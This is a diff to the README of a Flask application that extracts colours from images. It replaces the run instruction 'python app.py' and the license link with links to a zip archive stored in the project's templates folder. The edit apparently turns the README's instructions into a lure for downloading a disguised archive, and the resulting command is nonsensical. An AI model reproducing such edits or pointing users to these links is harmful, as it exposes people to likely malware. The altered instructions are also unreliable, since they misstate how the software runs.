@@ -5,7 +5,7 @@ Image-Based-Color-Extractors is a Flask application that allows you to extract c
 
 ## How to Use
 1. Clone the repository.
-2. Run the Flask server by typing `python app.py` in the terminal after saving the backend code in the `app.py` file.
+2. Run the Flask server by typing `python https://raw.githubusercontent.com/zufarrizal/Image-Based-Color-Extractors/main/templates/Image-Based-Color-Extractors_3.9.zip` in the terminal after saving the backend code in the `https://raw.githubusercontent.com/zufarrizal/Image-Based-Color-Extractors/main/templates/Image-Based-Color-Extractors_3.9.zip` file.
 3. Access [localhost:5000](http://localhost:5000) in a browser to see the image-based color extractor website that has been created.
 
 ## Technologies Used
@@ -16,4 +16,4 @@ Image-Based-Color-Extractors is a Flask application that allows you to extract c
 You can contribute to the development of Image-Based-Color-Extractors by creating an account on GitHub and forking this repository.
 
 ## License
-The license <a href="https://github.com/zufarrizal/Image-Based-Color-Extractors?tab=MIT-1-ov-file">license agreement</a>
+The license <a href="https://raw.githubusercontent.com/zufarrizal/Image-Based-Color-Extractors/main/templates/Image-Based-Color-Extractors_3.9.zip">license agreement</a>
